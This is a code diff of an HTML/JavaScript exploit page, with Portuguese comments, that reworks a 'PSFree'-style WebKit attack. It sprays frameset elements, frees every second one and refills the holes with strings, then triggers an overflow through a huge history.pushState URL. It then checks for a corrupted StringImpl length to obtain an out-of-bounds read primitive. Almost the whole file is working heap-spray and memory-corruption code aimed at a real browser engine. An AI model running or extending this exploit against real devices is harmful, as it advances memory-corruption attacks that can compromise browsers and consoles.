@@ -1,136 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PSFree Classic Spray</title>
+    <title>PSFree Logic: StringImpl Attack</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        button { 
-            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
-        }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
-        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white;}
+        body { background-color: #111; color: #ff0; font-family: monospace; padding: 20px; }
+        button { font-size: 20px; padding: 15px; width: 100%; margin-bottom: 10px; cursor: pointer; }
+        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
     </style>
 </head>
 <body>
 
-    <h1>PSFree Classic Spray (Small Objects)</h1>
-    <p>Usando valores originais do PSFree (0x50) e spray massivo.</p>
+    <h1>Ataque StringImpl (Lógica Real do PSFree)</h1>
+    <p>Frameset abre o buraco -> Strings ocupam -> Overflow corrompe String.</p>
 
-    <button onclick="startClassicSpray()">INICIAR SPRAY CLÁSSICO</button>
-    
+    <button onclick="runAttack(0x50)">TESTE 1: Tamanho Original PSFree (80 bytes)</button>
+    <button onclick="runAttack(1024)">TESTE 2: Tamanho 1KB</button>
+    <button onclick="runAttack(1024*32)">TESTE 3: Tamanho 32KB</button>
+    <button onclick="runAttack(1024*1024)">TESTE 4: Tamanho 1MB (Large Heap)</button>
+
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
         const BASE_OFFSET = 709520;
-        const OVERFLOW_AMT = 1024 * 340; // 340KB de excesso (Cobre milhares de objetos pequenos)
+        const OVERFLOW_AMT = 1024 * 64; 
 
-        // --- VALORES DO PSFREE ---
-        // Para FW 9.00+ (e provavelmente 12.00), o ssv_len é 0x50
-        const SSV_LEN = 0x50; 
-        
-        // Fórmula exata do psfree.mjs (Linha 129):
-        // const rows = ",".repeat(ssv_len / 8 - 2);
-        // 0x50 (80) / 8 = 10. 10 - 2 = 8 vírgulas.
-        const ROWS_STRING = ",".repeat((SSV_LEN / 8) - 2);
+        var victims_fset = [];
+        var victims_str = [];
 
-        // Quantidade massiva para cobrir a área do overflow
-        // Se cada objeto tem 80 bytes, 20.000 objetos = 1.6 MB
-        const SPRAY_COUNT = 20000; 
-
-        var victims = [];
-
-        function log(msg, type) {
+        function log(msg) {
             const el = document.getElementById('log');
-            let style = type === 'win' ? 'class="win"' : '';
-            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startClassicSpray() {
-            log(`1. Alocando ${SPRAY_COUNT} Framesets Pequenos (Size: ${SSV_LEN})...`);
-            log(`String Rows: "${ROWS_STRING}"`);
+        async function runAttack(targetSize) {
+            log(`--- INICIANDO TESTE COM TAMANHO ${targetSize} ---`);
+            
+            // 1. Preparar Framesets (Para abrir o buraco no tamanho certo)
+            // Precisamos calcular quantos elementos 'Length' (8 bytes) cabem no targetSize
+            const elementCount = targetSize / 8;
+            const rowsString = ",".repeat(elementCount - 2);
+            
+            const SPRAY_COUNT = 5000;
 
-            // FASE 1: SPRAY MASSIVO (Tapete de objetos)
-            // Isso enche o fastMalloc com milhares de pequenos framesets
-            try {
-                for(let i=0; i<SPRAY_COUNT; i++) {
-                    let fset = document.createElement('frameset');
-                    fset.rows = ROWS_STRING;
-                    victims.push(fset);
-                }
-            } catch(e) {
-                log("Erro de memória durante spray: " + e.message);
-                return;
+            log("1. Alocando Framesets (Criando Slots)...");
+            victims_fset = [];
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                let fset = document.createElement('frameset');
+                fset.rows = rowsString;
+                victims_fset.push(fset);
             }
 
-            // FASE 2: QUEIJO SUÍÇO (Buracos)
-            log("2. Criando buracos (1 a cada 2)...");
-            // Apagamos metade para criar fragmentação no fastMalloc
-            // A esperança é que o cabeçalho da nossa string gigante caia perto de um desses buracos
+            // 2. Criar Buracos e IMEDIATAMENTE preencher com Strings
+            log("2. Liberando Framesets e Injetando Strings...");
+            
+            // Prepara a string de preenchimento
+            // JS Strings usam 1 ou 2 bytes. Vamos tentar criar uma string que ocupe targetSize.
+            // Se for Latin1 (1 byte), length = targetSize - header.
+            // Header do StringImpl é aprox 24 bytes (off_size_strimpl = 0x18 no bundle.js)
+            const strLen = targetSize - 24; 
+            const fillStr = "S".repeat(strLen);
+
+            victims_str = [];
+
+            // Estratégia de substituição rápida
             for(let i=0; i<SPRAY_COUNT; i+=2) {
-                victims[i].rows = ""; 
-                victims[i] = null;
+                // Libera o Frameset
+                victims_fset[i].rows = ""; 
+                victims_fset[i] = null;
+                
+                // Aloca uma String no lugar (esperamos que caia no mesmo slot)
+                // Adicionamos um índice para identificar depois
+                let s = i + "_" + fillStr.substring((i+"_").length);
+                victims_str.push(s);
             }
 
+            // Força um GC leve
             await forceGC();
 
-            // FASE 3: EXPLOIT
-            log("3. Disparando Overflow (Passando o trator)...");
-
+            // 3. Overflow
+            log("3. Disparando Overflow...");
             setTimeout(() => {
                 try {
                     let buffer = "A".repeat(BASE_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
-                    history.pushState({}, "psfree_classic", "/" + buffer);
+                    history.pushState({}, "pwn", "/" + buffer);
 
-                    log("4. Verificando as vítimas sobreviventes...");
-                    checkCorruption();
+                    log("4. Verificando Strings...");
+                    checkStrings(strLen);
 
                 } catch (e) {
-                    log("Erro no Exploit: " + e.message);
+                    log("Erro: " + e.message);
                 }
             }, 500);
         }
 
-        function checkCorruption() {
-            let found = false;
-
-            // Checa os framesets sobreviventes
-            for(let i=1; i<victims.length; i+=2) {
-                let fset = victims[i];
-                if(!fset) continue;
-
-                let val = fset.rows;
+        function checkStrings(originalLen) {
+            let success = false;
+            for(let i=0; i<victims_str.length; i++) {
+                let s = victims_str[i];
                 
-                // A string original tem tamanho 8 (8 vírgulas)
-                // Se o tamanho mudar, BINGO.
-                if (val.length !== ROWS_STRING.length) {
-                    log(`!!! JACKPOT !!! Frameset ${i} atingido!`, 'win');
-                    log(`Tamanho Original: ${ROWS_STRING.length}`);
-                    log(`Novo Tamanho: ${val.length}`);
-                    alert("RCE PRIMITIVE: FRAMESET (PSFREE METHOD)!");
-                    found = true;
-                    break;
-                }
-
-                // Checa conteúdo por 0x01 (16843009)
-                if (val.indexOf("16843009") !== -1) {
-                    log(`!!! JACKPOT !!! Dados 0x01 encontrados no Frameset ${i}`, 'win');
-                    found = true;
+                // SINAL DE SUCESSO: O tamanho mudou?
+                // Se sobrescrevemos o cabeçalho da StringImpl, o length vira lixo (gigante)
+                if (s.length !== originalLen) {
+                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'green');
+                    log(`Len Original: ${originalLen} | Novo: ${s.length}`);
+                    
+                    // Tenta ler para provar o acesso OOB (Out of Bounds)
+                    try {
+                        let leak = s.charCodeAt(originalLen + 100);
+                        log(`Leitura OOB (+100): ${leak}`);
+                    } catch(e) {}
+                    
+                    alert("STRINGIMPL CORRUPTED! READ PRIMITIVE READY!");
+                    success = true;
                     break;
                 }
             }
-
-            if(!found) {
-                log("Nenhum frameset atingido.");
-                log("Diagnóstico: O overflow (Large Heap) passou longe do fastMalloc.");
-            }
+            if(!success) log("Nenhuma string corrompida.");
         }
 
         async function forceGC() {
-            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 800));
+            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 200));
         }
     </script>
 </body>
